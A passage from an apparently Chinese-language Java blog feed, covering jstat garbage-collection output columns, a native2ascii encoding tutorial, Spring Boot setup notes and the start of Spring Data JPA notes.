space当前容量的大小（KB）</td></tr><tr><td></td><td>OGCMN</td><td>老生代的最小容量大小（KB）</td></tr><tr><td></td><td>OGCMX</td><td>老生代的最大容量大小（KB）</td></tr><tr><td></td><td>OGC</td><td>当前老生代的容量大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前老生代的空间容量大小（KB）</td></tr><tr><td></td><td>PGCMN</td><td>持久代的最小容量大小（KB）</td></tr><tr><td></td><td>PGCMX</td><td>持久代的最大容量大小（KB）</td></tr><tr><td></td><td>PGC</td><td>当前持久代的容量大小（KB）</td></tr><tr><td></td><td>PC</td><td>当前持久代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td>-gcutil</td><td></td><td>监视内容与-gc基本相同，但输出主要关注已使用空间占总空间的百分比,查看新生代、老生代及持代垃圾收集的情况</td></tr><tr><td></td><td>S0</td><td>Heap上的 Survivor space 0 区已使用空间的百分比</td></tr><tr><td></td><td>S1</td><td>Heap上的 Survivor space 1 区已使用空间的百分比</td></tr><tr><td></td><td>E</td><td>Heap上的 Eden space 区已使用空间的百分比</td></tr><tr><td></td><td>O</td><td>Heap上的 Old space 区已使用空间的百分比</td></tr><tr><td></td><td>P</td><td>Perm space 区已使用空间的百分比</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 所用的时间(单位秒)</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gccause</td><td></td><td>与-gcutil功能一样，但是会额外输出导致上一次/当前GC产生的原因.</td></tr><tr><td></td><td>LGCC</td><td>最后一次垃圾收集的原因，可能为“unknown GCCause”、“System.gc()”等</td></tr><tr><td></td><td>GCC</td><td>当前垃圾收集的原因</td></tr><tr><td>–gcnew</td><td></td><td>监视新生代GC的状况 .</td></tr><tr><td></td><td>S0C</td><td>当前新生代中survivor space 0的容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中survivor space 1的容量大小（KB）</td></tr><tr><td></td><td>S0U</td><td>S0已经使用的大小（KB）</td></tr><tr><td></td><td>S1U</td><td>S1已经使用的大小（KB）</td></tr><tr><td></td><td>TT</td><td>Tenuring threshold，要了解这个参数，我们需要了解一点Java内存对象的结构，在Sun JVM中，（除了数组之外的）对象都有两个机器字（words）的头部。第一个字中包含这个对象的标示哈希码以及其他一些类似锁状态和等标识信息，第二个字中包含一个指向对象的类的引用，其中第二个字节就会被垃圾收集算法使用到。在新生代中做垃圾收集的时候，每次复制一个对象后，将增加这个对象的收集计数，当一个对象在新生代中被复制了一定次数后，该算法即判定该对象是长周期的对象 ，把他移动到老生代，这个阈值叫着tenuring threshold。这个阈值用于表示某个/些在执行批定次数youngGC后还活着的对象，即使此时新生的的Survior没有满，也同样被认为是长周期对象，将会被移到老生代中。</td></tr><tr><td></td><td>MTT</td><td>Maximum tenuring threshold，用于表示TT的最大值。</td></tr><tr><td></td><td>DSS</td><td>Desired survivor size (KB).可以参与这里：<a href="http://blog.csdn.net/yangjun2/article/details/6542357">http://blog.csdn.net/yangjun2/article/details/6542357</a></td></tr><tr><td></td><td>EC</td><td>Eden space当前容量的大小（KB）</td></tr><tr><td></td><td>EU</td><td>Eden space已经使用的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>YGCT</td><td>从应用程序启动到采样时 Young GC 所用的时间(单位秒)</td></tr><tr><td>–gcnewcapacity</td><td></td><td>监视内容与-gcnew基本相同，输出主要关注使用到的最大和最小空间.</td></tr><tr><td></td><td>NGCMN</td><td>新生代的最小容量大小（KB）</td></tr><tr><td></td><td>NGCMX</td><td>新生代的最大容量大小（KB）</td></tr><tr><td></td><td>NGC</td><td>当前新生代的容量大小（KB）</td></tr><tr><td></td><td>S0CMX</td><td>新生代中SO的最大容量大小（KB）</td></tr><tr><td></td><td>S0C</td><td>当前新生代中SO的容量大小（KB）</td></tr><tr><td></td><td>S1CMX</td><td>新生代中S1的最大容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中S1的容量大小（KB）</td></tr><tr><td></td><td>ECMX</td><td>新生代中Eden的最大容量大小（KB）</td></tr><tr><td></td><td>EC</td><td>当前新生代中Eden的容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td>–gcold</td><td></td><td>监视老年代及持久代GC的状况</td></tr><tr><td></td><td>PC</td><td>当前持久代容量的大小（KB）</td></tr><tr><td></td><td>PU</td><td>持久代使用容量的大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前老年代容量的大小（KB）</td></tr><tr><td></td><td>OU</td><td>老年代使用容量的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gcoldcapacity</td><td></td><td>监视内容与——gcold基本相同，输出主要关注使用到的最大和最小空间</td></tr><tr><td></td><td>OGCMN</td><td>老生代的最小容量大小（KB）</td></tr><tr><td></td><td>OGCMX</td><td>老生代的最大容量大小（KB）</td></tr><tr><td></td><td>OGC</td><td>当前老生代的容量大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前新生代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gcpermcapacity</td><td></td><td>输出永久代使用到的最大和最小空间</td></tr><tr><td></td><td>PGCMN</td><td>持久代的最小容量大小（KB）</td></tr><tr><td></td><td>PGCMX</td><td>持久代的最大容量大小（KB）</td></tr><tr><td></td><td>PGC</td><td>当前持久代的容量大小（KB）</td></tr><tr><td></td><td>PC</td><td>当前持久代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>–printcompilation</td><td></td><td>输出已经被JIT编译的方法,HotSpot编译方法的统计</td></tr><tr><td></td><td>Compiled</td><td>编译任务执行的次数</td></tr><tr><td></td><td>Size</td><td>方法的字节码所占的字节数</td></tr><tr><td></td><td>Type</td><td>编译类型</td></tr><tr><td></td><td>Method</td><td>指定确定被编译方法的类名及方法名，类名中使名“/”而不是“.”做为命名分隔符，方法名是被指定的类中的方法，这两个字段的格式是由HotSpot中的“-XX:+PrintComplation”选项确定的。</td></tr></tbody></table><p><a href="http://blog.csdn.net/fenglibing/article/details/6411951">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title>jdk自带转码工具native2ascii</title>
    <url>/2017/10/24/jdk-native2ascii/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在做Java开发的时候，常常会出现一些乱码，或者无法正确识别或读取的文件，比如常见的validator验证用的消息资源（properties）文 件就需要进行Unicode重新编码。原因是java默认的编码方式为Unicode，而计算机系统编码常常是GBK等编码。需要将系统的编码转换 为java正确识别的编码问题就解决了。</p><p>##语法格式:</p><p>native2ascii -[options] [intputfile] [outputfile]</p><p>语法格式说明:</p><p>-[options]：表示命令开关，有两个选项可供选择</p><p>　　-reverse：将Unicode编码转为本地或者指定编码，不指定编码情况下，将转为本地编码。</p><p>　　-encoding encoding_name：转换为指定编码，encoding_name为编码名称。</p><p>　　 [inputfile [outputfile]]</p><p>　　 inputfile：表示输入文件全名。</p><p>　　 outputfile：输出文件名。如果缺少此参数，将输出到控制台。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>native2ascii 工具将带有本机编码字符（非拉丁 1 和非单一码字符）的文件转换成带有Unicode编码字符的文件。 假设需要转化的属性文件为：D:\src\resources.properties（含有中文字符） ，转化后的属性文件为：D:\classes\resources.properties（中文字符统一转化为Unicode） 那么使用如下命令<br><code>JAVA_HOME\bin\native2ascii -encoding GBK D:\src\resources.properties D:\classes\resources.properties</code></p><h3 id="控制台转换字符"><a href="#控制台转换字符" class="headerlink" title="控制台转换字符"></a>控制台转换字符</h3><p>在控制台中可以输入汉字回车后，就可以看到转移后的字符了。<br>Ctrl+C退出。</p><h3 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h3><p><code>native2ascii allMessages_zh_CN.input.properties allMessages_zh_CN.properties</code><br>将文件allMessages_zh_CN.input.properties编码后输出为allMessages_zh_CN.properties。<br>为了方便properties文件的管理，建议纯中文的配置文件用input命名。</p><h3 id="反向单一"><a href="#反向单一" class="headerlink" title="反向单一"></a>反向单一</h3><p><code>native2ascii -reverse allMessages_zh_CN.properties allMessages_zh_CN.txt</code>注意-reverse参数</p><p>批量反向<br>JDK自带的工具native2ascii可以将uncode编码的文件转换为本地编码的文件，但是不能批量转换文件。</p><h2 id="用法介绍"><a href="#用法介绍" class="headerlink" title="用法介绍"></a>用法介绍</h2><p>如果应用系统是面向多种语言的，编程时就不得不设法解决国际化问题，包括操作界面的风格问题、提示和帮助语言的版本问题、界面定制个性化问题等。　由于Java语言具有平台无关、可移植性好等优点，并且提供了强大的类库，所以Java语言可以辅助我们解决上述问题。Java语言本身采用双字节字符编码，采用大汉字字符集，这就为解决国际化问题提供了很多方便。从设计角度来说，只要把程序中与语言和文化有关的部分分离出来，加上特殊处理，就可以部分解决国际化问题。在界面风格的定制方面，我们把可以参数化的元素，如字体、颜色等，存储在数据库里，以便为用户提供友好的界面；如果某些部分包含无法参数化的元素，那么我们可能不得不分别设计，通过有针对性的编码来解决具体问题。</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>首先将JDK的bin目录加入系统变量path。在盘下建立一个test目录，在test目录里建立一个zh.txt文件，文件内容为：“熔岩”，打开“命令行提示符”，并进入C:\test目录下。下面就可以按照说明一步一步来操作，注意观察其中编码的变化。</p><h3 id="A：将zh-txt转换为Unicode编码，输出文件到u-txt"><a href="#A：将zh-txt转换为Unicode编码，输出文件到u-txt" class="headerlink" title="A：将zh.txt转换为Unicode编码，输出文件到u.txt"></a>A：将zh.txt转换为Unicode编码，输出文件到u.txt</h3><p><code>native2ascii zh.txt u.txt</code><br>打开u.txt，内容为“\u7194\u5ca9”。</p><h3 id="B：将zh-txt转换为Unicode编码，输出到控制台"><a href="#B：将zh-txt转换为Unicode编码，输出到控制台" class="headerlink" title="B：将zh.txt转换为Unicode编码，输出到控制台"></a>B：将zh.txt转换为Unicode编码，输出到控制台</h3><p><code>C:\test&gt;native2ascii zh.txt</code><br>\u7194\u5ca9<br>可以看到，控制台输出了“\u7194\u5ca9”。</p><h3 id="C：将zh-txt转换为ISO8859-1编码，输出文件到i-txt"><a href="#C：将zh-txt转换为ISO8859-1编码，输出文件到i-txt" class="headerlink" title="C：将zh.txt转换为ISO8859-1编码，输出文件到i.txt"></a>C：将zh.txt转换为ISO8859-1编码，输出文件到i.txt</h3><p><code>native2ascii -encoding ISO8859-1 zh.txt i.txt</code><br>打开i.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。</p><h3 id="D：将u-txt转换为本地编码，输出到文件u-nv-txt"><a href="#D：将u-txt转换为本地编码，输出到文件u-nv-txt" class="headerlink" title="D：将u.txt转换为本地编码，输出到文件u_nv.txt"></a>D：将u.txt转换为本地编码，输出到文件u_nv.txt</h3><p><code>native2ascii -reverse u.txt u_nv.txt</code><br>打开u_nv.txt文件，内容为“熔岩”。</p><h3 id="E：将u-txt转换为本地编码，输出到控制台"><a href="#E：将u-txt转换为本地编码，输出到控制台" class="headerlink" title="E：将u.txt转换为本地编码，输出到控制台"></a>E：将u.txt转换为本地编码，输出到控制台</h3><p><code>C:\test&gt;native2ascii -reverse u.txt</code><br>熔岩<br>可以看到，控制台输出了“熔岩”。</p><h3 id="F：将i-txt转换为本地编码，输出到i-nv-txt"><a href="#F：将i-txt转换为本地编码，输出到i-nv-txt" class="headerlink" title="F：将i.txt转换为本地编码，输出到i_nv.txt"></a>F：将i.txt转换为本地编码，输出到i_nv.txt</h3><p><code>native2ascii -reverse i.txt i_nv.txt</code><br>打开i_nv.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。发现转码前后完全一样的。也就是说，等于没有转，或者说思想糊涂，对命名没有理解。。</p><h3 id="G：将i-txt转换为GBK编码，输出到i-gbk-txt"><a href="#G：将i-txt转换为GBK编码，输出到i-gbk-txt" class="headerlink" title="G：将i.txt转换为GBK编码，输出到i_gbk.txt"></a>G：将i.txt转换为GBK编码，输出到i_gbk.txt</h3><p><code>native2ascii -reverse -encoding GBK i.txt i_gbk.txt</code><br>打开i_gbk.txt文件，内容为“\u00c8\u00db\u00d1\u00d2”。发现转码前后完全一样的。也就是说，等于没有转，或者说思想糊涂，对命名没有理解。</p><h3 id="H：将u-nv-txt转码到本地编码GBK，输出到控制台"><a href="#H：将u-nv-txt转码到本地编码GBK，输出到控制台" class="headerlink" title="H：将u_nv.txt转码到本地编码GBK，输出到控制台"></a>H：将u_nv.txt转码到本地编码GBK，输出到控制台</h3><p><code>C:\test&gt;native2ascii -reverse -encoding ISO8859-1 i.txt</code><br>熔岩<br>从这个结果看，目标达到到了，编码i.txt为ISO8859-1，转为本地编码后内容为“熔岩”。从这里应该意识到，<red>native2ascii -reverse命令中-encoding指定的编码为源文件的编码格式。而在native2ascii 命令中-encoding指定的编码为（生成的）目标文件的编码格式。这一点非常的重要！切记！！</red><br>继续探索，新建文件12a.txt，内容“12axyz”。看看纯字母数字的编码又如何。</p><h3 id="I：将纯字母数字的文本文件12a-txt转换为Unicode编码"><a href="#I：将纯字母数字的文本文件12a-txt转换为Unicode编码" class="headerlink" title="I：将纯字母数字的文本文件12a.txt转换为Unicode编码"></a>I：将纯字母数字的文本文件12a.txt转换为Unicode编码</h3><p><code>native2ascii 12a.txt 12a_nv.txt</code><br>打开12a_nv.txt文件，内容为“12axyz”。<br>继续测试，转为ISO8859-1编码看看<br><code>C:\test&gt;native2ascii -encoding ISO8859-1 12a.txt</code><br>12axyz<br>结果还是没有转码。<br>从结果可以得出结论：对于纯数字和字母的文本类型件，转码前后的内容是一样的。</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>转码</tag>
      </tags>
  </entry>
  <entry>
    <title>关于使用Spring Boot的一些记录</title>
    <url>/2016/03/24/notes-for-Spring-Boot/</url>
    <content><![CDATA[<p><a href="http://projects.spring.io/spring-boot/">Spring Boot</a>，可以使人轻松的创建一个Spring工程，”just run”。<a href="http://spring.io/guides/gs/spring-boot/">官方示例</a>。<a href="http://docs.spring.io/spring-boot/docs/current-SNAPSHOT/reference/htmlsingle/">官方文档</a>。一个不错的<a href="https://github.com/qibaoguang/Spring-Boot-Reference-Guide/blob/master/all%20in%20one/spring_boot_features.md">中文文档</a></p><p>Spring Boot 最少需要java6，java7最好，官方推荐java8<br>可以指定为java6</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 这里一定要配置上java的版本，如果是1.7版本的可不用配置 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 配置你的tomcat版本 --&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- &lt;tomcat.version&gt;7.0.55&lt;/tomcat.version&gt; --&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如使用maven，需要maven3.2以上版本支持<br>程序可以部署在所有支持Servlet 3.0 以上的容器中</p><h2 id="搭建项目可能遇到的错误"><a href="#搭建项目可能遇到的错误" class="headerlink" title="搭建项目可能遇到的错误"></a>搭建项目可能遇到的错误</h2><ol><li><p>如果使用的MyEclipse创建项目，一开始暂时不要添加javaEE6.0Library。springboot 的logback-classes-1.1.2.jar的包下有一个org.slf4j.impl包 (这是springboot真正需要的包)而MyEclipse自带的javaEE6.0library里也有一个slf4j包，会有包冲突，会一直报 NoSuchMethod异常getSingleton()。</p></li><li><p>这里教大家一个快速找到class文件真正所处包的方法。<br>当无法确定某个类属于哪个包是 可以通过Test.class.getProtectionDomain();来查看<br>例如:发生noSuchMethod异常时，但是确实有该方法，一般就是重复加载了jar包。</p></li><li><p>官方文档的例子都是用java7运行的。不配置&lt;java.version&gt;1.6&lt;/java.version&gt;的话可能 会报版本异常的错误。类似mirro.minor什么51.0的 50表示jdk1.6 51是jdk1.7</p></li><li><p>如果也不配置tomcat版本的话springboot默认会使用8.x版本的tomcat。所以要加一个<br>&lt;tomcat.version&gt;7.0.55&lt;/tomcat.version&gt;来指定你所使用的tomcat版本(视你CATALINA_HOME配 置的所定)。</p></li></ol><h3 id="SpringApplication-程序入口"><a href="#SpringApplication-程序入口" class="headerlink" title="SpringApplication  程序入口"></a>SpringApplication 程序入口</h3><ol><li><p>程序入口<code>@SpringbootApplication</code>相当于<code>@Configuration</code>,<code>@EnableAutoConfiguration</code>和 <code>@ComponentScan</code></p></li><li><p>可以通过<code>@ImportResource</code>方式导入xml文件。也可以run的时候加载xml的配置<br><code>SpringApplication.run(&quot;classpath:/META-INF/application-context.xml&quot;, args);</code></p></li><li><p>SpringApplication类提供了一种从main()方法启动Spring应用的便捷方式。在很多情况下，你只需委托给SpringApplication.run这个静态方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    SpringApplication.run(MySpringConfiguration<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>自动配置对程序没有影响,我们随时可以修改自己的配置来替代自动配置。例如,如果我们添加自己的数据源，那么spring默认的将不再使用。如果你一定要消除某些特定配置可以这样来，如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.jdbc.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.*;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span>(exclude=&#123;DataSourceAutoConfiguration<span class="class">.<span class="keyword">class</span>&#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">MySpringConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="自定义Banner-程序启动时的打印项"><a href="#自定义Banner-程序启动时的打印项" class="headerlink" title="自定义Banner (程序启动时的打印项)"></a>自定义Banner (程序启动时的打印项)</h3><p>通过在classpath下添加一个banner.txt或设置banner.location来指定相应的文件可以改变启动过程中打印的banner。如果这个文件有特殊的编码，你可以使用banner.encoding设置它（默认为UTF-8）。</p><p>在banner.txt中可以使用如下的变量：<br>| 变量|描述|<br>| —–|——-|<br>| ${application.version} | MANIFEST.MF中声明的应用版本号，例如1.0 |<br>| ${application.formatted-version} | MANIFEST.MF中声明的被格式化后的应用版本号（被括号包裹且以v作为前缀），用于显示，例如(v1.0) |<br>| ${spring-boot.version} | 正在使用的Spring Boot版本号，例如1.2.2.BUILD-SNAPSHOT |<br>| ${spring-boot.formatted-version} | 正在使用的Spring Boot被格式化后的版本号（被括号包裹且以v作为前缀）, 用于显示，例如(v1.2.2.BUILD-SNAPSHOT) |</p><p>注：如果想以编程的方式产生一个banner，可以使用SpringBootApplication.setBanner(…)方法。使用org.springframework.boot.Banner接口，实现你自己的printBanner()方法。</p><h3 id="自定义SpringApplication"><a href="#自定义SpringApplication" class="headerlink" title="自定义SpringApplication"></a>自定义SpringApplication</h3><p>如果默认的SpringApplication不符合你的口味，你可以创建一个本地的实例并自定义它。例如，关闭banner你可以这样写：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    SpringApplication app = <span class="keyword">new</span> SpringApplication(MySpringConfiguration<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    app.setShowBanner(<span class="keyword">false</span>);</span><br><span class="line">    app.run(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：传递给SpringApplication的构造器参数是spring beans的配置源。在大多数情况下，这些将是<code>@Configuration</code>类的引用，但它们也可能是XML配置或要扫描包的引用。</p><p>你也可以使用application.properties文件来配置SpringApplication。。查看配置选项的完整列表，可参考<a href="http://docs.spring.io/spring-boot/docs/1.2.2.BUILD-SNAPSHOT/api/org/springframework/boot/SpringApplication.html">SpringApplication Javadoc</a>.</p><h3 id="流畅的构建API"><a href="#流畅的构建API" class="headerlink" title="流畅的构建API"></a>流畅的构建API</h3><p>除了通常的Spring框架的事件,如ContextRefreshedEvent SpringApplication发送一些额外的应用程序事件。触发一些事件实际上是ApplicationContext之前创建。<br>如果你需要创建一个分层的ApplicationContext（多个具有父子关系的上下文），或你只是喜欢使用流畅的构建API，你可以使用SpringApplicationBuilder。SpringApplicationBuilder允许你以链式方式调用多个方法，包括可以创建层次结构的parent和child方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> SpringApplicationBuilder()</span><br><span class="line">    .showBanner(<span class="keyword">false</span>)</span><br><span class="line">    .sources(Parent<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    .<span class="title">child</span>(<span class="title">Application</span>.<span class="title">class</span>)</span></span><br><span class="line"><span class="class">    .<span class="title">run</span>(<span class="title">args</span>)</span>;</span><br></pre></td></tr></table></figure><p>注：创建ApplicationContext层次时有些限制，比如，Web组件(components)必须包含在子上下文(child context)中，且相同的Environment即用于父上下文也用于子上下文中。具体参考<a href="http://docs.spring.io/spring-boot/docs/1.2.2.BUILD-SNAPSHOT/api/org/springframework/boot/builder/SpringApplicationBuilder.html">SpringApplicationBuilder javadoc</a></p><h3 id="Application事件和监听器"><a href="#Application事件和监听器" class="headerlink" title="Application事件和监听器"></a>Application事件和监听器</h3><p>除了常见的Spring框架事件，比如<a href="http://docs.spring.io/spring/docs/4.1.4.RELEASE/javadoc-api/org/springframework/context/event/ContextRefreshedEvent.html">ContextRefreshedEvent</a>一个SpringApplication也发送一些额外的应用事件。一些事件实际上是在ApplicationContext被创建前触发的。</p><p>你可以使用多种方式注册事件监听器，最普通的是使用SpringApplication.addListeners(…)方法。在你的应用运行时，应用事件会以下面的次序发送：</p><pre><code>1. 在运行开始，但除了监听器注册和初始化以外的任何处理之前，会发送一个`ApplicationStartedEvent`。
2. 在Environment将被用于已知的上下文，但在上下文被创建前，会发送一个`ApplicationEnvironmentPreparedEvent`。
3. 在refresh开始前，但在bean定义已被加载后，会发送一个`ApplicationPreparedEvent`。
4. 启动过程中如果出现异常，会发送一个`ApplicationFailedEvent`。</code></pre><p>注：你通常不需要使用应用程序事件，但知道它们的存在会很方便（在某些场合可能会使用到）。在Spring内部，Spring Boot使用事件处理各种各样的任务。</p><h3 id="Web环境"><a href="#Web环境" class="headerlink" title="Web环境"></a>Web环境</h3><p>一个SpringApplication将尝试为你创建正确类型的ApplicationContext。在默认情况下，使用AnnotationConfigApplicationContext或AnnotationConfigEmbeddedWebApplicationContext取决于你正在开发的是否是web应用。</p><p>用于确定一个web环境的算法相当简单（基于是否存在某些类）。如果需要覆盖默认行为，你可以使用setWebEnvironment(boolean webEnvironment)。通过调用setApplicationContextClass(…)，你可以完全控制ApplicationContext的类型。</p><p>注：当JUnit测试里使用SpringApplication时，调用setWebEnvironment(false)是可取的。</p><h3 id="命令行启动器"><a href="#命令行启动器" class="headerlink" title="命令行启动器"></a>命令行启动器</h3><p>如果你想获取原始的命令行参数，或一旦SpringApplication启动，你需要运行一些特定的代码，你可以实现CommandLineRunner接口。在所有实现该接口的Spring beans上将调用run(String… args)方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.*</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.*</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBean</span> <span class="keyword">implements</span> <span class="title">CommandLineRunner</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Do something...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果一些CommandLineRunner beans被定义必须以特定的次序调用，你可以额外实现org.springframework.core.Ordered接口或使用org.springframework.core.annotation.Order注解。</p><h3 id="Application退出"><a href="#Application退出" class="headerlink" title="Application退出"></a>Application退出</h3><p>每个SpringApplication在退出时为了确保ApplicationContext被优雅的关闭，将会注册一个JVM的shutdown钩子。所有标准的Spring生命周期回调（比如，DisposableBean接口或@PreDestroy注解）都能使用。</p><p>此外，如果beans想在应用结束时返回一个特定的退出码（exit code），可以实现org.springframework.boot.ExitCodeGenerator接口。</p><p>SpringApplication.exit(this.context);</p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>spring data jpa的一些使用笔记</title>
    <url>/2016/03/19/notes-for-spring-data-jpa/</url>
    <content><![CDATA[<p>JPA全称为Java持久性API（Java Persistence API），<a href="http://projects.spring.io/spring-data-jpa/">Spring Data JPA</a>是Spring Data中的一种JPA实现。<br>示例可见<a href="http://spring.io/guides/gs/accessing-data-jpa/">官方</a>，<a href="http://docs.spring.io/spring-data/data-jpa/docs/current/reference/html/">文档</a></p><h2 id="JPA使用Oracle序列作为实体ID"><a href="#JPA使用Oracle序列作为实体ID" class="headerlink" title="JPA使用Oracle序列作为实体ID"></a>JPA使用Oracle序列作为实体ID</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table</span>(name=<span class="string">"T_SPRINGJPA_USER"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 主键序列：DEFAULT_SUQUENCE 是我在oracle数据库中创建的一个序列</span></span><br><span class="line"><span class="comment">     *           MY_SUQUENCE 是给自定义的序列随意创建一个引用名称</span></span><br><span class="line"><span class="comment">     * 指我的主键生成策略 MY_SUQUENCE 使用的是 DEFAULT_SUQUENCE 这个序列。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SequenceGenerator</span>(name = <span class="string">"MY_SUQUENCE"</span>, sequenceName = <span class="string">"DEFAULT_SUQUENCE"</span>)</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span>(generator=<span class="string">"MY_SUQUENCE"</span>)</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column</span>(name=<span class="string">"USER_NAME"</span>)</span><br><span class="line">    <span class="keyword">private</span> String uName;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//some get and set</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Referencing explicitly mapped procedure with name "plus1inout" in database.</span></span><br><span class="line"><span class="meta">@Procedure</span>(<span class="string">"plus1inout"</span>)</span><br><span 